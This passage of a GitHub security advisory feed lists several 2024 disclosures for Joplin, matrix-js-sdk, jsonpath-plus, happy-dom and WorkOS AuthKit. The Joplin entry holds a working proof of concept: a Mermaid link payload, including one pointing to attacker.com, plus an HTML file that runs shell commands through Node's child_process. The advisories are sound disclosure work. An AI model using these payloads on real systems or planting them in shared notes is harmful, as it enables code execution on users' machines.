            <uri>https://github.com/advisories/GHSA-7q7g-4xm8-89cq</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-11-15T20:47:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[joplin] Remote Code Execution on click of <a> Link in markdown preview]]></title>
        <id>https://github.com/advisories/GHSA-hff8-hjwv-j9q7</id>
        <link href="https://github.com/advisories/GHSA-hff8-hjwv-j9q7"/>
        <updated>2024-11-14T22:45:17.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a vulnerability in <code>Joplin-desktop</code> that leads to remote code execution (RCE) when a user clicks on an <code>&lt;a&gt;</code> link within untrusted notes. The issue arises due to insufficient sanitization of <code>&lt;a&gt;</code> tag attributes introduced by the <code>Mermaid</code>. This vulnerability allows the execution of untrusted HTML content within the Electron window, which has full access to Node.js APIs, enabling arbitrary shell command execution.</p>
<h3 id="details">Details</h3>
<p>In the markdown preview iframe, <code>Joplin</code> only opens <code>&lt;a&gt;</code> links internally within the same Electron window if they contain the <code>data-from-md</code> attribute. While Joplin successfully sanitizes the <code>data-from-md</code> attribute in user-embedded <code>&lt;a&gt;</code> links from the <code>.md</code> file to prevent the execution of untrusted HTML content, it fails to sanitize the <code>data-from-md</code> attributes of <code>&lt;a&gt;</code> tags introduced by <code>Mermaid</code> (e.g., the code snippet shown below). Since <code>Mermaid</code> allows the rendering of certain scriptless HTML elements, an attacker can embed <code>&lt;a&gt; </code>tags with <code>data-from-md</code> attributes, which will then be opened internally in the same Electron window.</p>
<p>Additionally, <code>Joplin</code> opens the window with <code>nodeIntegration</code> set to <code>true</code> and <code>contextIsolation</code> set to <code>false</code>, resulting in any scripts running in the opened window having full access to Node.js APIs. Furthermore, the markdown preview iframe shares the same origin (i.e.,local file system) as its parent and lacks the <code>sandbox</code> attribute, allowing scripts running in the iframe to call Node.js APIs through <code>window.parent</code>. As a result, an attacker can execute arbitrary code using Node.js APIs by exploiting HTML files stored on the local file system, which share the same origin as the parent.</p>
<p><strong>Relevant code references:</strong></p>
<ul>
<li>Payload to inject <code>&lt;a&gt;</code> with <code>data-from-md</code> attribute:</li>
</ul>
<pre><code class="language-markdown">```mermaid
flowchart TD
    A[&lt;a href="https://attacker.com" data-from-md&gt;hello&lt;/a&gt;]
```
</code></pre>
<ul>
<li>Handling link navigation in the markdown preview iframe</li>
</ul>
<p><a href="https://github.com/laurent22/joplin/blob/e6c09da639adeb76f12e4477cc8442c49c0ced0c/packages/lib/renderers/webviewLib.js#L93-L116">https://github.com/laurent22/joplin/blob/e6c09da639adeb76f12e4477cc8442c49c0ced0c/packages/lib/renderers/webviewLib.js#L93-L116</a></p>
<ul>
<li>Window configuration of <code>Joplin</code> window</li>
</ul>
<p><a href="https://github.com/laurent22/joplin/blob/e6c09da639adeb76f12e4477cc8442c49c0ced0c/packages/app-desktop/ElectronAppWrapper.ts#L141-L155">https://github.com/laurent22/joplin/blob/e6c09da639adeb76f12e4477cc8442c49c0ced0c/packages/app-desktop/ElectronAppWrapper.ts#L141-L155</a></p>
<h3 id="poc">PoC</h3>
<p>Considering the user has downloaded the following shared files from the internet (Note: the threat model aligns with existing published security issues: <a href="https://github.com/laurent22/joplin/security/advisories/GHSA-2h88-m32f-qh5m">GHSA-2h88-m32f-qh5m</a> and <a href="https://github.com/laurent22/joplin/security/advisories/GHSA-g8qx-5vcm-3x59">GHSA-g8qx-5vcm-3x59</a>, where the malicious HTML file is available locally):</p>
<ul>
<li><code>poc.md</code></li>
</ul>
<pre><code class="language-markdown">```mermaid
flowchart TD
    A[&lt;a href="/../../../../../../../../../../../../../../../path/to/poc2.html" data-from-md&gt;hello&lt;/a&gt;]
```
</code></pre>
<ul>
<li><code>poc2.html</code></li>
</ul>
<pre><code>&lt;html&gt;
  &lt;body&gt;
    &lt;script&gt;
      if (typeof window.parent.require !== 'undefined') {
        const { exec } = window.parent.require('child_process');
        exec('ls -al', (err, stdout, stderr) =&gt; {
          if (err) {
            document.body.innerText = `Error: ${err.message}`;
            return;
          }
          if (stderr) {
            document.body.innerText = `Stderr: ${stderr}`;
            return;
          }
          document.body.innerText = stdout;
        });
      } else {
        document.body.innerText = 'Require is not available in this environment.';
      }
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>Then, open the <code>poc.md</code> with <code>Joplin</code> and click on the <code>hello</code> link. The code embedded in the <code>poc2.html</code> will be executed.</p>
<p><img alt="result" src="https://github.com/user-attachments/assets/e85fbad8-a348-49cd-af51-4fc302dd6a8f"></p>
<h3 id="impact">Impact</h3>
<p>This vulnerability can lead to Remote Code Execution (RCE) when users open and interact with untrusted notes, while malicious HTML files are available locally.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/laurent22/joplin/security/advisories/GHSA-hff8-hjwv-j9q7">https://github.com/laurent22/joplin/security/advisories/GHSA-hff8-hjwv-j9q7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-49362">https://nvd.nist.gov/vuln/detail/CVE-2024-49362</a></li>
<li><a href="https://github.com/advisories/GHSA-hff8-hjwv-j9q7">https://github.com/advisories/GHSA-hff8-hjwv-j9q7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hff8-hjwv-j9q7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-11-14T17:38:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dom-iterator] dom-iterator code execution vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-jrvm-mcxc-mf6m</id>
        <link href="https://github.com/advisories/GHSA-jrvm-mcxc-mf6m"/>
        <updated>2024-11-13T18:34:52.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of the package dom-iterator are vulnerable to Arbitrary Code Execution due to use of the Function constructor without complete input sanitization. Function generates a new function body and thus care must be given to ensure that the inputs to Function are not attacker-controlled. The risks involved are similar to that of allowing attacker-controlled input to reach eval.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21541">https://nvd.nist.gov/vuln/detail/CVE-2024-21541</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-DOMITERATOR-6157199">https://security.snyk.io/vuln/SNYK-JS-DOMITERATOR-6157199</a></li>
<li><a href="https://github.com/advisories/GHSA-jrvm-mcxc-mf6m">https://github.com/advisories/GHSA-jrvm-mcxc-mf6m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jrvm-mcxc-mf6m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-11-13T06:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[matrix-js-sdk] matrix-js-sdk has insufficient MXC URI validation which allows client-side path traversal]]></title>
        <id>https://github.com/advisories/GHSA-xvg8-m4x3-w6xr</id>
        <link href="https://github.com/advisories/GHSA-xvg8-m4x3-w6xr"/>
        <updated>2024-11-12T19:54:40.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>matrix-js-sdk before 34.11.0 is vulnerable to client-side path traversal via crafted MXC URIs. A malicious room member can trigger clients based on the matrix-js-sdk to issue arbitrary authenticated GET requests to the client's homeserver.</p>
<h3 id="details">Details</h3>
<p>The Matrix specification demands homeservers to <a href="https://spec.matrix.org/v1.12/client-server-api/#security-considerations-5">perform validation</a> of the <code>server-name</code> and <code>media-id</code> components of MXC URIs with the intent to prevent path traversal. However, it is not mentioned that a similar check must also be performed on the client to prevent <em>client-side</em> path traversal. matrix-js-sdk fails to perform this validation.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in matrix-js-sdk 34.11.1.</p>
<h3 id="workarounds">Workarounds</h3>
<p>None.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://spec.matrix.org/v1.12/client-server-api/#security-considerations-5">https://spec.matrix.org/v1.12/client-server-api/#security-considerations-5</a></li>
<li><a href="https://blog.doyensec.com/2024/07/02/cspt2csrf.html">https://blog.doyensec.com/2024/07/02/cspt2csrf.html</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/matrix-org/matrix-js-sdk/security/advisories/GHSA-xvg8-m4x3-w6xr">https://github.com/matrix-org/matrix-js-sdk/security/advisories/GHSA-xvg8-m4x3-w6xr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-50336">https://nvd.nist.gov/vuln/detail/CVE-2024-50336</a></li>
<li><a href="https://spec.matrix.org/v1.12/client-server-api/#security-considerations-5">https://spec.matrix.org/v1.12/client-server-api/#security-considerations-5</a></li>
<li><a href="https://github.com/advisories/GHSA-xvg8-m4x3-w6xr">https://github.com/advisories/GHSA-xvg8-m4x3-w6xr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xvg8-m4x3-w6xr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-11-12T19:54:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jsonpath-plus] JSONPath Plus Remote Code Execution (RCE) Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-pppg-cpfq-h7wr</id>
        <link href="https://github.com/advisories/GHSA-pppg-cpfq-h7wr"/>
        <updated>2024-11-18T18:32:11.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package jsonpath-plus before 10.0.7 are vulnerable to Remote Code Execution (RCE) due to improper input sanitization. An attacker can execute aribitrary code on the system by exploiting the unsafe default usage of vm in Node.</p>
<p><strong>Note:</strong></p>
<p>There was an attempt to fix it in version <a href="https://github.com/JSONPath-Plus/JSONPath/commit/6b2f1b4c234292c75912b790bf7e2d7339d4ccd3">10.0.0</a> but it could still be exploited using <a href="https://github.com/JSONPath-Plus/JSONPath/issues/226">different payloads</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21534">https://nvd.nist.gov/vuln/detail/CVE-2024-21534</a></li>
<li><a href="https://github.com/JSONPath-Plus/JSONPath/commit/6b2f1b4c234292c75912b790bf7e2d7339d4ccd3">https://github.com/JSONPath-Plus/JSONPath/commit/6b2f1b4c234292c75912b790bf7e2d7339d4ccd3</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-JSONPATHPLUS-7945884">https://security.snyk.io/vuln/SNYK-JS-JSONPATHPLUS-7945884</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8185019">https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8185019</a></li>
<li><a href="https://github.com/JSONPath-Plus/JSONPath/issues/226">https://github.com/JSONPath-Plus/JSONPath/issues/226</a></li>
<li><a href="https://github.com/JSONPath-Plus/JSONPath/commit/b70aa713553caf838a63bac923195a5bc541fd72">https://github.com/JSONPath-Plus/JSONPath/commit/b70aa713553caf838a63bac923195a5bc541fd72</a></li>
<li><a href="https://github.com/JSONPath-Plus/JSONPath/issues/226#issuecomment-2424230316">https://github.com/JSONPath-Plus/JSONPath/issues/226#issuecomment-2424230316</a></li>
<li><a href="https://github.com/JSONPath-Plus/JSONPath/compare/v9.0.0...v10.1.0">https://github.com/JSONPath-Plus/JSONPath/compare/v9.0.0...v10.1.0</a></li>
<li><a href="https://github.com/advisories/GHSA-pppg-cpfq-h7wr">https://github.com/advisories/GHSA-pppg-cpfq-h7wr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pppg-cpfq-h7wr</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-10-11T15:30:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[happy-dom] happy-dom allows for server side code to be executed by a <script> tag]]></title>
        <id>https://github.com/advisories/GHSA-96g7-g7g9-jxw8</id>
        <link href="https://github.com/advisories/GHSA-96g7-g7g9-jxw8"/>
        <updated>2024-11-06T23:39:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Consumers of the NPM package <code>happy-dom</code></p>
<h3 id="patches">Patches</h3>
<p>The security vulnerability has been patched in v15.10.2</p>
<h3 id="workarounds">Workarounds</h3>
<p>No easy workarounds to my knowledge</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/capricorn86/happy-dom/issues/1585">#1585</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/capricorn86/happy-dom/security/advisories/GHSA-96g7-g7g9-jxw8">https://github.com/capricorn86/happy-dom/security/advisories/GHSA-96g7-g7g9-jxw8</a></li>
<li><a href="https://github.com/capricorn86/happy-dom/issues/1585">https://github.com/capricorn86/happy-dom/issues/1585</a></li>
<li><a href="https://github.com/capricorn86/happy-dom/pull/1586">https://github.com/capricorn86/happy-dom/pull/1586</a></li>
<li><a href="https://github.com/capricorn86/happy-dom/commit/5ee0b1676d4ce20cc2a70d1c9c8d6f1e3f57efac">https://github.com/capricorn86/happy-dom/commit/5ee0b1676d4ce20cc2a70d1c9c8d6f1e3f57efac</a></li>
<li><a href="https://github.com/capricorn86/happy-dom/commit/d23834c232f1cf5519c9418b073f1dcec6b2f0fd">https://github.com/capricorn86/happy-dom/commit/d23834c232f1cf5519c9418b073f1dcec6b2f0fd</a></li>
<li><a href="https://github.com/capricorn86/happy-dom/releases/tag/v15.10.2">https://github.com/capricorn86/happy-dom/releases/tag/v15.10.2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-51757">https://nvd.nist.gov/vuln/detail/CVE-2024-51757</a></li>
<li><a href="https://github.com/advisories/GHSA-96g7-g7g9-jxw8">https://github.com/advisories/GHSA-96g7-g7g9-jxw8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-96g7-g7g9-jxw8</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-11-06T15:27:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@workos-inc/authkit-remix] @workos-inc/authkit-remix refresh tokens are logged when the debug flag is enabled]]></title>
        <id>https://github.com/advisories/GHSA-v2qh-f584-6hj8</id>
        <link href="https://github.com/advisories/GHSA-v2qh-f584-6hj8"/>
        <updated>2024-11-05T21:37:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Refresh tokens are logged to the console when the disabled by default <code>debug</code> flag, is enabled.</p>
<h3 id="patches">Patches</h3>
<p>Patched in <a href="https://github.com/workos/authkit-remix/releases/tag/v0.4.1">https://github.com/workos/authkit-remix/releases/tag/v0.4.1</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/workos/authkit-remix/security/advisories/GHSA-v2qh-f584-6hj8">https://github.com/workos/authkit-remix/security/advisories/GHSA-v2qh-f584-6hj8</a></li>
<li><a href="https://github.com/workos/authkit-remix/commit/32d5bcd54c795c1e2a3204f8e3977ab9ad57ec06">https://github.com/workos/authkit-remix/commit/32d5bcd54c795c1e2a3204f8e3977ab9ad57ec06</a></li>
<li><a href="https://github.com/workos/authkit-remix/releases/tag/v0.4.1">https://github.com/workos/authkit-remix/releases/tag/v0.4.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-51753">https://nvd.nist.gov/vuln/detail/CVE-2024-51753</a></li>
<li><a href="https://github.com/advisories/GHSA-v2qh-f584-6hj8">https://github.com/advisories/GHSA-v2qh-f584-6hj8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v2qh-f584-6hj8</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-11-05T17:34:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@workos-inc/authkit-nextjs] @workos-inc/authkit-nextjs refresh tokens are logged when the debug flag is enabled]]></title>
        <id>https://github.com/advisories/GHSA-5wmg-9cvh-qw25</id>
        <link href="https://github.com/advisories/GHSA-5wmg-9cvh-qw25"/>
        <updated>2024-11-05T21:37:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Refresh tokens are logged to the console when the disabled by default <code>debug</code> flag, is enabled.</p>
<h3 id="patches">Patches</h3>
<p>Patched in <a href="https://github.com/workos/authkit-nextjs/releases/tag/v0.13.2">https://github.com/workos/authkit-nextjs/releases/tag/v0.13.2</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/workos/authkit-nextjs/security/advisories/GHSA-5wmg-9cvh-qw25">https://github.com/workos/authkit-nextjs/security/advisories/GHSA-5wmg-9cvh-qw25</a></li>
<li><a href="https://github.com/workos/authkit-nextjs/commit/15a332632f7560b03cc6d8cc8da24fd2ac931da7">https://github.com/workos/authkit-nextjs/commit/15a332632f7560b03cc6d8cc8da24fd2ac931da7</a></li>
<li><a href="https://github.com/workos/authkit-nextjs/releases/tag/v0.13.2">https://github.com/workos/authkit-nextjs/releases/tag/v0.13.2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-51752">https://nvd.nist.gov/vuln/detail/CVE-2024-51752</a></li>
<li><a href="https://github.com/advisories/GHSA-5wmg-9cvh-qw25">https://github.com/advisories/GHSA-5wmg-9cvh-qw25</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5wmg-9cvh-qw25</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-11-05T17:34:23.000Z</published>
    </entry>
</feed>